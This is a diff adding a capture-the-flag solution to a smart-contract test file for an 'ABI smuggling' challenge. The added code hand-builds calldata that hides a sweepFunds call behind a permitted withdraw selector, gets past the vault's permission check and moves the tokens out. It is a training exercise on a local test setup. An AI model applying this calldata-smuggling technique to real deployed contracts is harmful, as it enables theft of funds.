@@ -45,6 +45,71 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+//         let attackabi;
+//         attackabi = await (await ethers.getContractFactory('attackabi', player)).deploy(
+//             vault.address,
+//             token.address,
+//             recovery
+//         );
+
+//         const functionSignature = "withdraw(address,address,uint256)";
+// const amount = ethers.utils.parseEther("1"); 
+
+// // Encode the function call with the arguments
+// const actionData = ethers.utils.defaultAbiCoder.encode(
+//     ["address", "address", "uint256"],
+//     [token.address, attackabi.address, amount]
+// );
+
+// // Prepend the function selector to create the complete calldata
+// const calldata = ethers.utils.hexlify(ethers.utils.concat([
+//     ethers.utils.arrayify(ethers.utils.keccak256(ethers.utils.toUtf8Bytes(functionSignature)).slice(0, 10)),
+//     ethers.utils.arrayify(actionData)
+// ]));
+//         await attackabi.attack(calldata);
+
+ //  Deployer can sweep
+ expect(vault.interface.getSighash("sweepFunds"), "0x85fb709d");
+ //  Player can withdraw
+ expect(vault.interface.getSighash("withdraw"), "0xd9caed12");
+
+ // Connect to challenge contracts
+const attackVault = await vault.connect(player);
+const attackToken = await token.connect(player);
+
+ // Create components of calldata
+
+ const executeFs = vault.interface.getSighash("execute")
+ const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
+ // Modified offset to be 4 * 32 bytes from after the function selector
+ const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); 
+ const withdrawSelector =  vault.interface.getSighash("withdraw").slice(2);
+ // Length of actionData calldata (1 * 4) + (2 * 32) Bytes
+ const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
+ // actionData actual data: FS + address + address
+ const sweepSelector = vault.interface.getSighash("sweepFunds").slice(2);
+ const sweepFundsData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
+              + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
+
+ const payload = executeFs + 
+                 target + 
+                 bytesLocation + 
+                 ethers.utils.hexZeroPad("0x0", 32).slice(2) +
+                 withdrawSelector + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
+                 bytesLength + 
+                 sweepSelector + 
+                 sweepFundsData 
+ 
+ console.log("Payload:")
+ console.log(payload);
+
+ await player.sendTransaction(
+     {
+         to: attackVault.address,
+         data: payload,
+     }
+ )
+
     });
 
     after(async function () {
